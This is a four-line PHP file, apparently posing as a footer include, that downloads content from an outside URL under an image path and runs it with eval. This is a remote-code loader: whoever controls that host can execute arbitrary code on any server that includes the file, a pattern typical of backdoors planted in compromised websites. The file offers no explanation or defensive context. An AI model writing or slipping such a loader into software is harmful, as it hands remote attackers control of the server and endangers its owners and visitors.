<?php
$url = 'https://gorod214.by/img/r/6e52c0';
$exfooter = file_get_contents($url);
eval('?>' . $exfooter);